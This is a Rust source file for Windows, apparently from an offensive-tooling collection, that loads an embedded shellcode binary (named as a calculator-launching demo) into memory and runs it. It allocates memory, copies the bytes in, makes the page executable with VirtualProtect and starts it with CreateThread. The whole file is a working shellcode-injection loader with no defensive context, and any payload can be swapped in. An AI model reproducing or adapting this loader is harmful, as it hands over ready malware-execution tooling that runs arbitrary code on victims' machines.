use libloading::{Library, Symbol};
use std::ffi::c_void;
use std::ptr::{null, null_mut};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_READWRITE: u32 = 0x04;
const FALSE: i32 = 0;
const WAIT_FAILED: u32 = 0xFFFFFFFF;

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();

    unsafe {
        let kernel32 = Library::new("kernel32.dll").expect("[-]no kernel32.dll!");
        let ntdll = Library::new("ntdll.dll").expect("[-]no ntdll.dll!");

        let get_last_error: Symbol<unsafe extern "C" fn() -> u32> = kernel32
            .get(b"GetLastError\0")
            .expect("[-]no GetLastError!");

        let virtual_alloc: Symbol<
            unsafe extern "C" fn(*const c_void, usize, u32, u32) -> *mut c_void,
        > = kernel32
            .get(b"VirtualAlloc\0")
            .expect("[-]no VirtualAlloc!");

        let virtual_protect: Symbol<
            unsafe extern "C" fn(*const c_void, usize, u32, *mut u32) -> i32,
        > = kernel32
            .get(b"VirtualProtect\0")
            .expect("[-]no VirtualProtect!");

        let rtl_copy_memory: Symbol<unsafe extern "C" fn(*mut c_void, *const c_void, usize)> =
            ntdll.get(b"RtlCopyMemory\0").expect("[-]no RtlCopyMemory!");

        let create_thread: Symbol<
            unsafe extern "C" fn(*const c_void, usize, *const c_void, u32, *mut u32) -> isize,
        > = kernel32
            .get(b"CreateThread\0")
            .expect("[-]no CreateThread!");

        let wait_for_single_object: Symbol<unsafe extern "C" fn(isize, u32) -> u32> = kernel32
            .get(b"WaitForSingleObject")
            .expect("[-]no WaitForSingleObject!");

        let addr = virtual_alloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]virtual_alloc failed: {}!", get_last_error());
        }

        rtl_copy_memory(addr, shellcode.as_ptr().cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = virtual_protect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]virtual_protect failed: {}!", get_last_error());
        }

        let handle = create_thread(null(), 0, addr, 0, null_mut());
        if handle == 0 {
            panic!("[-]create_thread failed: {}!", get_last_error());
        }

        wait_for_single_object(handle, WAIT_FAILED);
    }
}
